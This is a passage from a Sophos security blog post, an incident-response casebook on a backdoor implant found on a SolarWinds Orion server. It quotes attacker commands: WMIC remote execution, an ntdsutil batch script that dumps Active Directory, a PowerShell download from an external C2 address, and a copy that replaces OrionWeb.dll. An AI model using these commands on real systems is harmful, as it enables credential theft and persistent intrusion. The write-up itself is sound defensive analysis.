<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://news.sophos.com/xmlrpc.php">
<link rel="alternate" hreflang="en-us" href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" /><!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl+ '&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x';f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-5L6H3LN');</script>
<!-- End Google Tag Manager -->
<title>MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server &#8211; Sophos News</title>
<meta name='robots' content='max-image-preview:large' />
<!-- Jetpack Site Verification Tags -->
<meta name="google-site-verification" content="8r1qg681OjOolfxmHEY1IYupmTBdyKXc-OPfpgeQHFk" />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//v0.wordpress.com' />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Feed" href="https://news.sophos.com/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; Comments Feed" href="https://news.sophos.com/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title="Sophos News &raquo; MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server Comments Feed" href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/feed/" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/news.sophos.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.7"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='all-css-0' href='https://news.sophos.com/_static/??/wp-includes/css/dist/block-library/style.min.css,/wp-content/themes/sophosnews-2017/style.css,/wp-content/mu-plugins/jetpack-9.5/css/jetpack.css?m=1615460090' type='text/css' media='all' />
<style id='wp-block-library-inline-css'>
.has-text-align-justify{text-align:justify;}
</style>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJzTLy/QzcxLzilNSS3WzwKiwtLUokoopZebmaeXVayjj0+Rbm5melFiSSpUsX2uraGZoamxkaGpqXEWAK9AIhg='></script>
<link rel="https://api.w.org/" href="https://news.sophos.com/wp-json/" /><link rel="alternate" type="application/json" href="https://news.sophos.com/wp-json/wp/v2/posts/72266" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://news.sophos.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://news.sophos.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.7" />
<link rel="canonical" href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" />
<link rel='shortlink' href='https://news.sophos.com/?p=72266' />
<link rel="alternate" type="application/json+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2021%2F02%2F03%2Fmtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://news.sophos.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fnews.sophos.com%2Fen-us%2F2021%2F02%2F03%2Fmtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server%2F&#038;format=xml" />
<style type='text/css'>img#wpstats{display:none}</style><link rel="amphtml" href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/amp/">
<!-- Jetpack Open Graph Tags -->
<meta property="og:type" content="article" />
<meta property="og:title" content="MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server" />
<meta property="og:url" content="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" />
<meta property="og:description" content="A real-world story from the Sophos Managed Threat Response team" />
<meta property="article:published_time" content="2021-02-03T17:07:13+00:00" />
<meta property="article:modified_time" content="2021-02-11T16:04:58+00:00" />
<meta property="og:site_name" content="Sophos News" />
<meta property="og:image" content="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640" />
<meta property="og:image:secure_url" content="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640" />
<meta property="og:image:width" content="640" />
<meta property="og:image:height" content="335" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server" />
<meta name="twitter:image" content="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="fb:admins" content="28552295016" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=32" sizes="32x32" />
<link rel="icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=192" sizes="192x192" />
<link rel="apple-touch-icon" href="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=180" />
<meta name="msapplication-TileImage" content="https://news.sophos.com/wp-content/uploads/2020/01/cropped-sophos.png?w=270" />
</head>

<body class="post-template-default single single-post postid-72266 single-format-standard group-blog">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-5L6H3LN&gtm_auth=d5XceCG5H_eblswmMfURjQ&gtm_preview=env-2&gtm_cookies_win=x"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header">

		<div class="header-container">

			<div class="site-branding">
				<h1 class="site-title">
										<a class="site-logo" href="https://www.sophos.com/en-us.aspx" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- site-branding -->

			<nav class="primary-header-navigation" role="navigation">
				<ul id="menu-en-us-primary" class="menu"><li id="menu-item-33368" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33368"><a href="https://www.sophos.com/en-us/products.aspx">Products<div class="menu-item-description"></div></a></li>
<li id="menu-item-33382" class="has-icons menu-item menu-item-type-custom menu-item-object-custom menu-item-33382"><a href="https://www.sophos.com/en-us/solutions.aspx">Solutions<div class="menu-item-description"></div></a></li>
<li id="menu-item-33390" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33390"><a href="//www.sophos.com/en-us/partners.aspx">Partners<div class="menu-item-description"></div></a></li>
<li id="menu-item-33391" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33391"><a href="//www.sophos.com/en-us/support.aspx">Support<div class="menu-item-description"></div></a></li>
<li id="menu-item-33392" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33392"><a href="//www.sophos.com/en-us/company.aspx">Company<div class="menu-item-description"></div></a></li>
<li id="menu-item-33393" class="is-icon icon-download menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-33393"><a href="#">Downloads<div class="menu-item-description"></div></a>
<ul class="sub-menu">
	<li id="menu-item-33394" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33394"><a href="//www.sophos.com/en-us/products/free-trials.aspx">Free Trials<div class="menu-item-description">All product trials in one place.</div></a></li>
	<li id="menu-item-33395" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33395"><a href="//www.sophos.com/en-us/products/free-tools.aspx">Free Tools<div class="menu-item-description">Try our tools for use at home.</div></a></li>
	<li id="menu-item-33396" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33396"><a href="//www.sophos.com/en-us/products/request-a-quote.aspx">Get Pricing<div class="menu-item-description">The right price every time.</div></a></li>
</ul>
</li>
<li id="menu-item-33397" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33397"><a href="//www.sophos.com/en-us/search-results.aspx">Search<div class="menu-item-description"></div></a></li>
<li id="menu-item-33398" class="is-icon icon-account menu-item menu-item-type-custom menu-item-object-custom menu-item-33398"><a href="//www.sophos.com/en-us/login.aspx">Sign In<div class="menu-item-description"></div></a></li>
</ul>			</nav>

		</div>
	</header> <!-- site-header -->

	<div class="secondary-header">
		<div class="secondary-header-container container">
			<nav class="secondary-header-navigation" role="navigation">
				<ul id="menu-en-us-secondary" class="menu"><li id="menu-item-33399" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33399"><a href="//www.sophos.com/en-us/company.aspx">Overview</a></li>
<li id="menu-item-33401" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33401"><a href="//www.sophos.com/en-us/company/press.aspx">Press</a></li>
<li id="menu-item-33402" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33402"><a href="//secure2.sophos.com/en-us/company/events.aspx">Events</a></li>
<li id="menu-item-33403" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33403"><a href="//www.sophos.com/en-us/company/community.aspx">Community</a></li>
<li id="menu-item-33404" class="menu-item-blog menu-item menu-item-type-custom menu-item-object-custom menu-item-33404"><a href="/">Blog</a></li>
<li id="menu-item-33405" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33405"><a href="//secure2.sophos.com/en-us/company/careers.aspx">Careers</a></li>
<li id="menu-item-33406" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-33406"><a href="//www.sophos.com/en-us/company/contact.aspx">Contact</a></li>
</ul>			</nav>
		</div>
	</div> <!-- secondary-header -->

	<div class="news-header">
		<div class="news-header-container container">

			<div class="news-branding">
				<h1 class="news-title">
					<a class="news-logo" href="https://news.sophos.com/en-us/" rel="home">
						Sophos News					</a>
				</h1>
			</div> <!-- news-branding -->

			<div class="mobile-menu-toggle">
				<a href="#newsmenu">
											Menu									</a>
			</div>

			<div class="mobile-search-toggle">
				<a class="icon icon-search-secondary" href="#search">
					Search				</a>
			</div>

			<nav class="news-header-navigation" role="navigation">
				<ul id="menu-en-us-tertiary" class="menu"><li id="menu-item-33407" class="is-icon icon-search menu-item menu-item-type-custom menu-item-object-custom menu-item-33407"><a href="#search">Search</a></li>
</ul>			</nav>

			<div class="site-search-block" style="display: none;">
				<form role="search" class="search-form" method="get" action="https://news.sophos.com/en-us/">
					<fieldset>
						<div class="field">
							<input type="text" value="" name="s" class="search-field" placeholder="Search">
						</div>
						<div class="submit">
							<button type="submit" class="search-submit icon icon-search-secondary">
								Go							</button>
						</div>
					</fieldset>
				</form>
				<a class="icon" href="#search-close">
					Close				</a>
			</div>
		</div>
	</div> <!-- news-header -->

	<div id="content" class="site-content">
		<div class="content-container">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-72266" class="post-72266 post type-post status-publish format-standard has-post-thumbnail hentry category-mtr category-security-operations tag-mtr tag-ransomware tag-sidebar tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">

	<header class="entry-header">

		<h1 class="entry-title">MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server</h1>
		<div class="entry-categories">
			<a href="https://news.sophos.com/en-us/tag/mtr/">MTR</a>&bull;<a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations</a>&bull;<a href="https://news.sophos.com/en-us/tag/ransomware/">Ransomware</a>&bull;<a href="https://news.sophos.com/en-us/tag/sophos-managed-threat-response-mtr/">Sophos Managed Threat Response (MTR)</a>&bull;<a href="https://news.sophos.com/en-us/tag/sophos-mtr/">Sophos MTR</a>		</div>

					<div class="entry-excerpt">
				<p>A real-world story from the Sophos Managed Threat Response team</p>
			</div>
		
		<div class="entry-meta">
			<span class="posted-on"><a href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" rel="bookmark">3 February 2021</a></span>		</div><!-- .entry-meta -->

		<div class="entry-social">
			
	<ul class="social-sharing" id="social-sharing">
		<li class="comments">
			<a href="#comments" title="Leave a Reply">
				0			</a>
		</li>
		<li class="twitter"><a class="js-share-modal" href="http://twitter.com/intent/tweet?text=MTR%20casebook%3A%20Uncovering%20a%20backdoor%20implant%20in%20a%20SolarWinds%20Orion%20server%20https%3A%2F%2Fnews.sophos.com%2F%3Fp%3D72266" data-title="" title="Share on Twitter">Share on Twitter</a></li>
		<li class="facebook"><a class="js-share-modal" href="http://www.facebook.com/share.php?u=https://news.sophos.com/?p=72266&#038;title=MTR%20casebook:%20Uncovering%20a%20backdoor%20implant%20in%20a%20SolarWinds%20Orion%20server" data-title="MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server" title="Share on Facebook">Share on Facebook</a></li>
		<li class="linkedin">
			<a
				href="http://www.linkedin.com/shareArticle?mini=true&url=https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/"
				data-title="MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server"
				title="Share on LinkedIn"
				onclick="window.open(this.href, '', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
			>
				Share on LinkedIn			</a>
		</li>
	</ul>

			</div><!-- .entry-social -->
	</header><!-- .entry-header -->

		<div class="entry-featured-image">
		<img width="640" height="335" src="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" loading="lazy" srcset="https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png 1200w, https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?resize=300,157 300w, https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?resize=768,402 768w, https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?resize=1024,536 1024w" sizes="(max-width: 640px) 100vw, 640px" />	</div> <!-- .featured-image -->
	
	<div class="entry-meta">
		<span class="byline">By <span class="author vcard"><a href="https://news.sophos.com/en-us/author/greg-iddon/" title="Posts by Greg Iddon" class="author url fn" rel="author">Greg Iddon</a></span></span>	</div><!-- .entry-meta -->

	<div class="entry-content">
		<p><strong>Please note: Although elements of this story may seem connected to the recent SolarWinds Sunburst attack, we have not found any concrete evidence that these two incidents are related.</strong></p>
<p><em>Customer profile: An internet service provider and telecommunications organization based in the USA with approximately 1700 devices.</em></p>
<p>The Sophos <a href="https://sophos.com/mtr">Managed Threat Response</a> (MTR) team provides 24/7 threat hunting, detection, and response capabilities delivered by an expert team as a fully-managed service. Sophos <a href="https://sophos.com/rapidresponse">Rapid Response</a> provides emergency remote incident response for active incidents.</p>
<h2>Setting the scene</h2>
<p>The organization in question came to Sophos Rapid Response after falling victim to a <a href="https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/">Ragnar Locker</a> attack in early 2020. A ransomware payload was delivered manually by a highly capable group at around 2 a.m., while admins were asleep, hitting as many computers as they could in quick succession.</p>
<p>They hit hundreds.</p>
<p>Sophos Rapid Response was brought in to help identify, contain and neutralize the threat. It took the team less than two days to resolve the active threat and over the following days incident responders were able to ascertain the threat actor had entered the network two months prior to the ransomware attack.</p>
<p>With the Ragnar group removed from their network, the customer transitioned to the full MTR service in Notify mode with our security operations team watching over them 24/7.</p>
<p>While the pressing threat of Ragnar Locker was out of the picture, in November 2020 another threat actor stepped into view&#8230;</p>
<h2>Sneaking over WMI</h2>
<p>Increasingly, threat actors like to pack light when on a mission. They don’t bring their own tools and prefer to “live off the land.” They take advantage of capabilities built into operating systems, like Microsoft Windows, to evade detection.</p>
<p>Windows Management Instrumentation, or WMI for short, is a feature that enables remote management and automation of administrative tasks. It’s designed to ease the pains of managing large enterprise environments with an overwhelming number of computers.</p>
<p>But in the hands of a threat actor, WMI offers quite the rich toolbox to achieve a number of wide-ranging goals. And with WMIC, the command line interface for WMI, adversaries can write simple yet powerful one-line instructions.</p>
<p>For example, running Notepad on a remote computer:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/notepad.png"><img loading="lazy" class="alignnone wp-image-72368" src="https://news.sophos.com/wp-content/uploads/2021/02/notepad.png" alt="" width="480" height="418" srcset="https://news.sophos.com/wp-content/uploads/2021/02/notepad.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/notepad.png?resize=300,261 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>wmic /user:"username” /password:”password” /node:"192.168.0.123" process call create “notepad.exe”</pre>
<p>Or listing all the local user accounts on a computer:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/accounts.png"><img loading="lazy" class="alignnone wp-image-72375" src="https://news.sophos.com/wp-content/uploads/2021/02/accounts.png" alt="" width="480" height="420" srcset="https://news.sophos.com/wp-content/uploads/2021/02/accounts.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/accounts.png?resize=300,263 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>wmic useraccount get /ALL /format:csv</pre>
<p>Hunting for abuse of WMI is essential, but discerning the difference between legitimate use of WMI and malicious use is no easy task, often requiring a keen eye towards the context of the commands. What commands came before? What commands came after? What is the intent?</p>
<p>These are the questions our MTR operators ask themselves as a number of suspicious looking WMI commands are identified in the customer&#8217;s network, all taking place in quick succession, during a routine threat hunt alongside researchers from SophosLabs.</p>
<h2>Hunting for threat actors</h2>
<p>The threat hunters see the first red flag. WMIC was used to instruct remote computers to launch commands. This alone is suspicious, but where did the commands come from?</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png"><img loading="lazy" class="alignnone wp-image-72390 " src="https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png" alt="" width="809" height="153" srcset="https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png 3196w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=300,57 300w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=768,145 768w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=1024,194 1024w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=1536,291 1536w, https://news.sophos.com/wp-content/uploads/2021/02/w3wp-tree.png?resize=2048,388 2048w" sizes="(max-width: 809px) 100vw, 809px" /></a></p>
<p>Looking at the hierarchy, <code>wmic.exe</code> was executed by <code>cmd.exe</code>, the Windows Command Prompt. And <code>cmd.exe</code> was executed by <code>w3wp.exe</code>, a worker process for Microsoft IIS – a web server.</p>
<p>A web server. Surely no measured admin would launch administrative commands to other servers from their own web server?</p>
<p>And what is going on in this command seen on the web server?</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/backup-bat.png"><img loading="lazy" class="alignnone wp-image-72377" src="https://news.sophos.com/wp-content/uploads/2021/02/backup-bat.png" alt="" width="480" height="140" srcset="https://news.sophos.com/wp-content/uploads/2021/02/backup-bat.png 719w, https://news.sophos.com/wp-content/uploads/2021/02/backup-bat.png?resize=300,87 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>wmic /node:192.168.0.123 /user:"REDACTED" /password:"REDACTED" process call create "c:\Windows\Temp\backup.bat"</pre>
<p>WMIC calls out to a remote computer, authenticated with credentials, to create a new process and execute a script called <code>backup.bat</code>. On its own, it’s not terribly suspicious. But given that this was initiated by a web server worker process, we need to dig deeper. What is <code>backup.bat</code>?</p>
<p>MTR finds another troubling command.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/update-download.png"><img loading="lazy" class="alignnone wp-image-72389" src="https://news.sophos.com/wp-content/uploads/2021/02/update-download.png" alt="" width="480" height="170" srcset="https://news.sophos.com/wp-content/uploads/2021/02/update-download.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/update-download.png?resize=300,106 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>cmd /c "powershell (new-object system.net.webclient).downloadfile('http://98[.]225.248.37:8090/update','c:\users\public\update')"&amp;exit</pre>
<p>Combined with the context of the previous command, it is clearly suspicious to see PowerShell (another Microsoft task automation and configuration management tool) creating a webclient to “downloadfile” from an unknown host, a file called “update”.</p>
<p>Before continuing, an MTR operator sends the first notification to the customer and engages their admin team.</p>
<p>The operator shares the observed WMIC commands as well as the servers and users associated with the commands, with guidance to reset those user passwords and to use Sophos Intercept X to isolate the servers from the rest of the network. Additionally, that strange IP address needs blocking on their firewall.</p>
<p>On with the investigation.</p>
<p>Looking back in time to the preceding commands, the picture becomes clearer.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/ntdsutil.png"><img loading="lazy" class="alignnone wp-image-72384" src="https://news.sophos.com/wp-content/uploads/2021/02/ntdsutil.png" alt="" width="480" height="284" srcset="https://news.sophos.com/wp-content/uploads/2021/02/ntdsutil.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/ntdsutil.png?resize=300,177 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>cmd /c "echo mkdir c:\windows\temp\tmp &gt; \\192.168.0.123\c$\Windows\Temp\backup.bat" 
cmd /c "echo ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\tmp" q q &gt;&gt; \\192.168.0.123\c$\Windows\Temp\backup.bat"</pre>
<p>That’s no backup command. A <code>.bat</code> file is a Batch script, the classic way of bundling Windows commands together rather than running each by hand.</p>
<p>Echo typically prints a line of text to the screen (i.e. the command terminal) however the <code>&gt;</code> symbol is a redirect. Instead of writing the text <code>mkdir …</code> to the terminal, it’s writing to a file on a remote system.</p>
<p>The threat actor built a script on a remote computer. And they had run it.</p>
<p>First it creates a new “tmp” folder in the Windows temporary directory (where things are put when it doesn’t matter if they disappear later on). Next it uses <code>ntdsutil.exe</code>&#8230;</p>
<p>To a veteran threat hunter, the threat actor’s goal is clear.</p>
<h2>Credential access to elevate privileges</h2>
<p>Ntdsutil is short for NT Directory Services Utility. It is a tool for interacting with Active Directory servers, Microsoft’s centralized suite of technologies responsible for authenticating and authorizing users and computers in a Windows domain.</p>
<p>The arguments <code>"ac i ntds" ifm "create full …"</code> writes a full dump, a copy, of the entire Active Directory database intended for the legitimate purpose of domain controller deployment using the “install from media” option.</p>
<p>This actor tried to get their hands on credentials, and that variant of the command is often used by threat actors who have access to the domain controller but don’t yet have domain admin credentials.</p>
<p>They tried to elevate privileges. And they were caught red-handed.</p>
<p>An operator gets back in touch with the customer to fill them in with the latest discoveries. The customer initiates domain-wide password resets. Better to be safe than sorry.</p>
<p>With the malicious IP blocked, all passwords reset, and those servers isolated, the threat actor is dead in the water.</p>
<p>But it is still a mystery how they orchestrated these commands. Where is the initial point of entry?</p>
<p>What did they do on that webserver?</p>
<h2>Web shells</h2>
<p>Public webservers are inherently risky. Not only do they face the internet, making them a prime target for an adversary’s initial intrusion into an organization’s network, it’s normal for them to communicate with a wide range of IP addresses never seen before.</p>
<p>All that web traffic, all that noise, makes web servers a wonderful place to hide and launch commands. Only a keen eye will spot that needle amongst the hay. Especially if you’re only looking at network traffic.</p>
<p>Thankfully, MTR collects endpoint telemetry as well as network telemetry, providing rich data to contextualize anything that might be found.</p>
<p>Looking over all the commands the threat actor ran on the server, a pattern emerges.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/big-fm.png"><img loading="lazy" class="alignnone wp-image-72379" src="https://news.sophos.com/wp-content/uploads/2021/02/big-fm.png" alt="" width="480" height="116" srcset="https://news.sophos.com/wp-content/uploads/2021/02/big-fm.png 700w, https://news.sophos.com/wp-content/uploads/2021/02/big-fm.png?resize=300,72 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>cmd /c "copy \\192.168.0.123\c$\windows\temp\tmp\big.fm f:\sites\REDACTED\big.fm"</pre>
<p>This command called out to a remote server to copy a file called <code>big.fm</code> from the tmp directory we saw earlier. Sadly, “Big FM” is not the name of the threat actor’s favorite Top 40 radio station, it’s what the threat actor named the Active Directory database dump.</p>
<p>What sticks out in this command, and many others they ran, is they only copied files to a particular folder on the webserver inside <code>f:\sites\</code>. Almost as if this was the only folder they had permissions to access. A folder where the website code resides.</p>
<p>This smells like a web shell.</p>
<p>Looking inside <code>f:\sites\</code> our MTR operator finds a lonely looking file called <code>about.aspx</code>. Active Server Page Extended (ASPX) is a framework for writing dynamic websites. Taking a look over the code, our operator observes that the web page will receive encoded web requests and send the decoded request to cmd.exe, the Windows command prompt.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png"><img loading="lazy" class="alignnone size-full wp-image-72374" src="https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png" alt="" width="640" height="592" srcset="https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png 1726w, https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png?resize=300,278 300w, https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png?resize=768,711 768w, https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png?resize=1024,947 1024w, https://news.sophos.com/wp-content/uploads/2021/02/about-aspx.png?resize=1536,1421 1536w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>This is a web shell.</p>
<p>But why wasn’t it detected earlier?</p>
<p>Grabbing a copy of the file, MTR sends this immediately to SophosLabs for deeper analysis. Even as the file passes through our automated analysis systems, it’s clear this web shell variant has never been seen before. SophosLabs researchers quickly tear it apart and publish detections for this new variant, protecting all our customers around the globe from this web shell should it be used again.</p>
<p>At the time of writing this article we are the only vendor with a detection published for this web shell variant (detected as <a href="https://www.virustotal.com/gui/file/f39dc0dfd43477d65c1380a7cff89296ad72bfa7fc3afcfd8e294f195632030e/detection">Troj/WebShel-H</a>). The file hash is in the IOCs table at the bottom of this article.</p>
<p>With the web shell neutralized (hopefully along with the threat actor’s access), our operators move their focus to answering several important questions: Where did this web shell come from? What else was it used for? And what was the file update that the threat actor downloaded?</p>
<h2>OrionWeb.dll</h2>
<p>Scouring historic telemetry gathered by MTR since the service’s technology was deployed shows no signs of when the web shell was installed. Plenty of file accesses and timestamp modifications are observed, but it’s clear the web shell was deployed before Rapid Response had been engaged and our telemetry collection began.</p>
<p>This is a dead end.</p>
<p>Looking to what events preceded the download of the file update prove to be more fruitful albeit concerning including another request to a different C2 &#8211; http://216[.]243.39.167:8090/ &#8211; to fetch another version of the file.</p>
<p>The following command is observed:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/update-copy.png"><img loading="lazy" class="alignnone wp-image-72388" src="https://news.sophos.com/wp-content/uploads/2021/02/update-copy.png" alt="" width="480" height="116" srcset="https://news.sophos.com/wp-content/uploads/2021/02/update-copy.png 702w, https://news.sophos.com/wp-content/uploads/2021/02/update-copy.png?resize=300,72 300w" sizes="(max-width: 480px) 100vw, 480px" /></a></p>
<pre>cmd /c "copy \\192.168.0.124\c$\inetpub\SolarWinds\orion\update \\10.128.11.149\c$\inetpub\SolarWinds\bin\OrionWeb.dll /y"</pre>
